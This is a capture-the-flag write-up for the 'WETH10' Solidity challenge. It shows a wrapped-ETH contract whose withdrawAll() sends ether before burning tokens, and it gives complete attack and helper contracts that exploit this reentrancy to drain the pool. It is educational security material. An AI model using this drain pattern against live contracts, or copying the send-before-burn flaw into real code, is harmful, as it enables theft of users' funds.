# WETH10

## Challenge

We are provided a contract:

```solidity
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

// The Messi Wrapped Ether
contract WETH10 is ERC20("Messi Wrapped Ether", "WETH10"), ReentrancyGuard {
    receive() external payable {
        deposit();
    }

    function _burnAll() internal {
        _burn(msg.sender, balanceOf(msg.sender));
    }

    function deposit() public payable nonReentrant {
        _mint(msg.sender, msg.value);
    }

    function withdraw(uint256 wad) external nonReentrant {
        Address.sendValue(payable(msg.sender), wad);
        _burn(msg.sender, wad);
    }

    function withdrawAll() external nonReentrant {
        Address.sendValue(payable(msg.sender), balanceOf(msg.sender));
        _burnAll();
    }

    /// @notice Request a flash loan in ETH
    function execute(address receiver, uint256 amount, bytes calldata data) external nonReentrant {
        uint256 prevBalance = address(this).balance;
        Address.functionCallWithValue(receiver, data, amount);

        require(address(this).balance >= prevBalance, "flash loan not returned");
    }
}
```

and a poc setup:

```solidity
contract Weth10Test is Test {
    WETH10 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH10();
        bob = makeAddr("bob");

        vm.deal(address(weth), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(address(weth).balance, 10 ether, "weth contract should have 10 ether");


        vm.startPrank(bob);

        // hack time!

        vm.stopPrank();
        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
    }
}
```

Challenge Description:
The contract currently has 10 ethers. (Check the Foundry configuration.)
You are Bob (the White Hat). Your job is to rescue all the funds from the contract, starting with 1 ether, in only one transaction.

## Analysis

At first i thought that I could just use the execute function to call the _mint() function of the WETH10 contract and generate myself enough tokens to withdraw all the eth. I then learned that internal functions can never be accessed via call() from this stackoverflow post (https://ethereum.stackexchange.com/questions/15663/cannot-call-internal-function-via-call). 

The next thing I found is that the execute doesn't check for the value being bigger than 0, so you can also set it to 0 and call non payable functions as the contract. Unfortunately this was not the way to solve this chall. Nevertheless in the case of the WETH contract owning tokens itself we could transfer these tokens to us if we want, by abusing the call.

## Solution

The vulnerability lies in the external call in withdrawAll(). We get sent all the money our tokens are worth and afterward all our tokens are burnt. The problem is that inbetween these 2 checks we can do whatever we want:

1. Our token balance gets counted
2. We get sent the value of these tokens
3. !!! We can do whatever we want !!!
4. All the tokens we own are burnt.

So what we can do is to transfer the tokens somewhere else after they were counted and then let the account burn our remaining tokens(0) afterwards. Then we just give the tokens back to our original contract and withdraw again. Rinse and repeat until we have all the eth. To do this I implemented an attak kcontract that does the main work:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./WETH10.sol";
import "./Returner.sol";

contract Attack
{
    WETH10 target;
    Returner returner;
    constructor(address payable _target)
    {
        target = WETH10(_target);
        returner = new Returner(_target);
    }

    function attack() payable external
    {
        target.deposit{value: msg.value}();
        target.withdrawAll();

        for (int i = 0; i < 10; i++)
        {
            returner.returnTokens();
            target.withdrawAll();
        }

        (msg.sender).call{value: 11 ether}("");
    }

    fallback() external payable
    {
        target.transfer(address(returner), target.balanceOf(address(this)));
    }
}
```
As well as the Returner contract which we use to store the tokens during the burning phase:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./WETH10.sol";

contract Returner
{
    address owner;
    WETH10 target;

    constructor(address payable _target)
    {
        owner = msg.sender;
        target = WETH10(_target);
    }

    function returnTokens() public
    {
        target.transfer(owner, target.balanceOf(address(this)));
    }
}
```
Having these 2 we can just deploy the attack contract as bob and call the attack function to drain the contract. You can see the implementation in the POC.sol file.


